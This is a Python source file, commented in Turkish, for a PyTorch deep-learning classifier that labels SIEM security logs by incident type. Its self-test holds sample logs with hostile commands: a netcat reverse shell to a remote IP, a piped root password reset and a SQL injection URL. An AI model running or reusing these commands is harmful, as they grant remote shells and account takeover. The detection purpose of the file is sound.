# File: src/deep_classifier.py
# Description: Production-Grade PyTorch GPU Deep Learning Engine for SIEM Incident Taxonomy
# Architecture: Character Embedding -> 1D-CNN (Local Feature Extraction) -> BiLSTM (Sequential Context) -> Self-Attention -> Multi-Class Head

import os
import math
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
from typing import Dict, List, Tuple, Any, Union
import joblib

from config.incident_config import config
from src.preprocessor import LogPreprocessor


# =========================================================================
# 1. CHARACTER VOCABULARY & TOKENIZER (Zero-Unknown Character Mapping)
# =========================================================================
class CharTokenizer:
    """
    Log metinlerini sabit uzunluklu tam sayı (Integer) dizilerine dönüştüren 
    GPU uyumlu Karakter Seviyesi Tokenizer.
    """
    def __init__(self, max_len: int = 256):
        self.max_len = max_len
        # Standart ASCII görünür karakterleri + Özel Sentetik Bayraklar
        self.pad_token = "<PAD>"
        self.unk_token = "<UNK>"
        
        self.chars = [self.pad_token, self.unk_token] + [chr(i) for i in range(32, 127)]
        self.char_to_idx = {char: idx for idx, char in enumerate(self.chars)}
        self.idx_to_char = {idx: char for idx, char in enumerate(self.chars)}
        self.vocab_size = len(self.chars)

    def encode(self, text: str) -> List[int]:
        """Metni integer dizisine çevirir ve max_len uzunluğuna pad/truncate eder."""
        tokens = [self.char_to_idx.get(ch, self.char_to_idx[self.unk_token]) for ch in text]
        if len(tokens) < self.max_len:
            tokens += [self.char_to_idx[self.pad_token]] * (self.max_len - len(tokens))
        else:
            tokens = tokens[:self.max_len]
        return tokens

    def encode_batch(self, text_list: List[str]) -> torch.Tensor:
        """Metin listesini LongTensor biçiminde matrise çevirir."""
        encoded = [self.encode(text) for text in text_list]
        return torch.tensor(encoded, dtype=torch.long)


# =========================================================================
# 2. PYTORCH DATASET & COLLATOR
# =========================================================================
class SIEMLogDataset(Dataset):
    def __init__(self, logs: List[str], labels: List[int], tokenizer: CharTokenizer):
        self.logs = logs
        self.labels = labels
        self.tokenizer = tokenizer

    def __len__(self):
        return len(self.logs)

    def __getitem__(self, idx):
        return {
            "text": self.logs[idx],
            "label": torch.tensor(self.labels[idx], dtype=torch.long)
        }


# =========================================================================
# 3. DEEP NEURAL NETWORK ARCHITECTURE (1D-CNN + BiLSTM + Attention)
# =========================================================================
class SelfAttention(nn.Module):
    """
    Önemli payload parçalarına (Örn: 'union select', 'memfd_exec', 'nc -e') 
    odaklanmayı sağlayan Self-Attention Katmanı.
    """
    def __init__(self, hidden_dim: int):
        super(SelfAttention, self).__init__()
        self.projection = nn.Sequential(
            nn.Linear(hidden_dim, 64),
            nn.Tanh(),
            nn.Linear(64, 1)
        )

    def forward(self, lstm_outputs: torch.Tensor) -> torch.Tensor:
        # lstm_outputs shape: [batch_size, seq_len, hidden_dim]
        energy = self.projection(lstm_outputs) # [batch_size, seq_len, 1]
        weights = F.softmax(energy, dim=1) # [batch_size, seq_len, 1]
        context = torch.sum(lstm_outputs * weights, dim=1) # [batch_size, hidden_dim]
        return context


class DeepSIEMClassifierNet(nn.Module):
    """
    GPU Üzerinde Çalışan Derin Sınıflandırma Mimarisi.
    Karakter Embedding -> Parallel 1D Multi-Kernel Conv -> BiLSTM -> Self-Attention -> Dense Head
    """
    def __init__(self, vocab_size: int, num_classes: int, embed_dim: int = 64, hidden_dim: int = 128):
        super(DeepSIEMClassifierNet, self).__init__()
        
        # Karakter Gömme Katmanı (Character Embedding)
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
        
        # Paralel Multi-Kernel 1D-CNN (3'lü, 5'li ve 7'li karakter dizilimlerini yakalar)
        self.conv3 = nn.Conv1d(in_channels=embed_dim, out_channels=64, kernel_size=3, padding=1)
        self.conv5 = nn.Conv1d(in_channels=embed_dim, out_channels=64, kernel_size=5, padding=2)
        self.conv7 = nn.Conv1d(in_channels=embed_dim, out_channels=64, kernel_size=7, padding=3)
        
        self.batch_norm = nn.BatchNorm1d(192)
        self.dropout = nn.Dropout(0.3)
        
        # Çift Yönlü LSTM (Bidirectional LSTM)
        self.bilstm = nn.LSTM(
            input_size=192,
            hidden_size=hidden_dim,
            num_layers=2,
            batch_first=True,
            bidirectional=True,
            dropout=0.2
        )
        
        # Attention & Tam Bağlantılı Sınıflandırma Katmanları
        self.attention = SelfAttention(hidden_dim * 2)
        self.fc1 = nn.Linear(hidden_dim * 2, 128)
        self.relu = nn.ReLU()
        self.out_head = nn.Linear(128, num_classes)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        # x shape: [batch_size, seq_len]
        embeds = self.embedding(x) # [batch_size, seq_len, embed_dim]
        embeds_permuted = embeds.permute(0, 2, 1) # [batch_size, embed_dim, seq_len]
        
        # Parallel Convolution
        c3 = F.relu(self.conv3(embeds_permuted))
        c5 = F.relu(self.conv5(embeds_permuted))
        c7 = F.relu(self.conv7(embeds_permuted))
        
        # Concatenate Channels
        conv_out = torch.cat([c3, c5, c7], dim=1) # [batch_size, 192, seq_len]
        conv_out = self.batch_norm(conv_out)
        conv_out = self.dropout(conv_out)
        
        # Reshape for LSTM: [batch_size, seq_len, channels]
        lstm_input = conv_out.permute(0, 2, 1)
        lstm_out, _ = self.bilstm(lstm_input) # [batch_size, seq_len, hidden_dim * 2]
        
        # Attention Pooling
        attn_out = self.attention(lstm_out) # [batch_size, hidden_dim * 2]
        
        # Dense Classifier Head
        dense = self.dropout(self.relu(self.fc1(attn_out)))
        logits = self.out_head(dense) # [batch_size, num_classes]
        return logits


# =========================================================================
# 4. GPU DEEP LEARNING ENGINE WRAPPER
# =========================================================================
class GPUDeepSIEMClassifier:
    """
    PyTorch Model Eğitimi, Kaydetme, Yükleme ve GPU Çıkarım (Inference) Arayüzü.
    """
    def __init__(self, max_seq_len: int = 256, batch_size: int = 1024, lr: float = 1e-3):
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        self.preprocessor = LogPreprocessor()
        self.tokenizer = CharTokenizer(max_len=max_seq_len)
        self.batch_size = batch_size
        self.lr = lr
        
        self.model = None
        self.label_to_idx = {}
        self.idx_to_label = {}
        self.is_fitted = False

        print(f"🚀 [GPU ENGINE] Çalıştırıcı Aygıt: {self.device}")
        if self.device.type == "cuda":
            print(f"   └─ GPU Adı: {torch.cuda.get_device_name(0)}")
            print(f"   └─ Toplam VRAM: {torch.cuda.get_device_properties(0).total_memory / 1e9:.2f} GB")

    def fit(self, raw_logs: List[str], labels: List[str], epochs: int = 5) -> "GPUDeepSIEMClassifier":
        """Modeli CUDA GPU üzerinde eğitir."""
        # Etiket Dönüşüm Haritası
        unique_labels = sorted(list(set(labels)))
        self.label_to_idx = {lbl: i for i, lbl in enumerate(unique_labels)}
        self.idx_to_label = {i: lbl for i, lbl in enumerate(unique_labels)}
        num_classes = len(unique_labels)
        
        # Metinleri Ön İşleme
        cleaned_logs = self.preprocessor.transform_batch(raw_logs)
        numeric_labels = [self.label_to_idx[lbl] for lbl in labels]
        
        # DataLoader
        dataset = SIEMLogDataset(cleaned_logs, numeric_labels, self.tokenizer)
        dataloader = DataLoader(dataset, batch_size=self.batch_size, shuffle=True, num_workers=2, pin_memory=True)
        
        # Model & Optimizer
        self.model = DeepSIEMClassifierNet(
            vocab_size=self.tokenizer.vocab_size,
            num_classes=num_classes
        ).to(self.device)
        
        criterion = nn.CrossEntropyLoss()
        optimizer = torch.optim.AdamW(self.model.parameters(), lr=self.lr, weight_decay=1e-4)
        scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=epochs)

        print(f"\n🏋️ [GPU TRAINING] {len(raw_logs):,} log üzerinde {epochs} Epoch eğitim başlatılıyor...")
        self.model.train()
        
        for epoch in range(1, epochs + 1):
            total_loss = 0.0
            correct = 0
            total = 0
            
            for batch in dataloader:
                texts = batch["text"]
                targets = batch["label"].to(self.device)
                
                inputs = self.tokenizer.encode_batch(texts).to(self.device)
                
                optimizer.zero_grad()
                outputs = self.model(inputs)
                loss = criterion(outputs, targets)
                
                loss.backward()
                optimizer.step()
                
                total_loss += loss.item() * inputs.size(0)
                _, predicted = outputs.max(1)
                total += targets.size(0)
                correct += predicted.eq(targets).sum().item()
                
            scheduler.step()
            epoch_loss = total_loss / total
            epoch_acc = (correct / total) * 100.0
            print(f"   Epoch [{epoch}/{epochs}] -> Loss: {epoch_loss:.5f} | Accuracy: %{epoch_acc:.2f}")

        self.is_fitted = True
        print("✅ [GPU TRAINING] Derin Öğrenme Modeli Başarıyla Eğitildi!")
        return self

    def predict_single(self, raw_log: str) -> Dict[str, Any]:
        """Tek bir log için GPU üzerinde milisaniyeler içinde çıkarım yapar."""
        if not self.is_fitted or self.model is None:
            raise RuntimeError("Model henüz eğitilmedi veya yüklenmedi!")

        self.model.eval()
        cleaned_log = self.preprocessor.clean_single_log(raw_log)
        inputs = self.tokenizer.encode_batch([cleaned_log]).to(self.device)
        
        with torch.no_grad():
            logits = self.model(inputs)
            probs = F.softmax(logits, dim=1)[0]
            
        best_idx = torch.argmax(probs).item()
        confidence = probs[best_idx].item() * 100.0
        predicted_label = self.idx_to_label[best_idx]
        
        taxonomy_info = config.taxonomy.CATEGORIES.get(predicted_label, {
            "title": "Bilinmeyen Olay", "mitre_id": "T1082", "urgency": "INFO", "playbook": "SOC İncelemesi."
        })

        return {
            "predicted_category": predicted_label,
            "confidence": round(confidence, 2),
            "taxonomy": taxonomy_info,
            "cleaned_log": cleaned_log,
            "device_used": str(self.device)
        }

    def save(self, filepath: str = "models/gpu_deep_incident_model.pt"):
        """Model ağırlıklarını ve durumunu kaydeder."""
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        checkpoint = {
            "model_state": self.model.state_dict(),
            "label_to_idx": self.label_to_idx,
            "idx_to_label": self.idx_to_label,
            "tokenizer": self.tokenizer,
            "is_fitted": self.is_fitted
        }
        torch.save(checkpoint, filepath)
        print(f"💾 [GPU MODEL] PyTorch Derin Öğrenme Modeli Kaydedildi: {filepath}")

    @classmethod
    def load(cls, filepath: str = "models/gpu_deep_incident_model.pt"):
        """Kayıtlı modeli GPU bellegine yükler."""
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"Model bulunamadı: {filepath}")

        instance = cls()
        checkpoint = torch.load(filepath, map_location=instance.device, weights_only=False)
        
        instance.label_to_idx = checkpoint["label_to_idx"]
        instance.idx_to_label = checkpoint["idx_to_label"]
        instance.tokenizer = checkpoint["tokenizer"]
        instance.is_fitted = checkpoint["is_fitted"]
        
        instance.model = DeepSIEMClassifierNet(
            vocab_size=instance.tokenizer.vocab_size,
            num_classes=len(instance.label_to_idx)
        ).to(instance.device)
        
        instance.model.load_state_dict(checkpoint["model_state"])
        instance.model.eval()
        
        print(f"📦 [GPU MODEL] PyTorch Derin Öğrenme Modeli GPU'ya Yüklendi ({instance.device})")
        return instance


# Doğrulama Testi
if __name__ == "__main__":
    test_logs = [
        "Aug 13 12:00:11 srv-web-prod01 bash[30100]: Executed: /bin/nc -e /bin/bash 194.26.29.112 4444",
        "Aug 13 12:01:13 srv-db-node02 bash[30200]: Executed: echo 'root:p@ssw0rd123!' | /usr/sbin/chpasswd",
        "Aug 13 12:02:11 srv-app-cluster01 nginx[2200]: 194.26.29.112 - - 'GET /page.php?id=1'%20UNION%20SELECT%20null--",
        "Aug 13 12:07:09 srv-k8s-worker3 auditd[850]: exe='/memfd:malicious (deleted)' key='memfd_exec'"
    ] * 100
    test_labels = ["NETWORK_C2", "SYSTEM_INTEGRITY", "APPLICATION_EXPLOIT", "PROCESS_INJECTION"] * 100

    print("--- GPU DEEP CLASSIFIER VERIFICATION ---")
    deep_clf = GPUDeepSIEMClassifier(batch_size=32)
    deep_clf.fit(test_logs, test_labels, epochs=2)
    
    res = deep_clf.predict_single("Aug 13 12:00:11 srv-web-prod01 bash: /bin/nc -e /bin/bash 194.26.29.112 4444")
    print(f"\nPrediction Result: {res['predicted_category']} (%{res['confidence']}) on {res['device_used']}")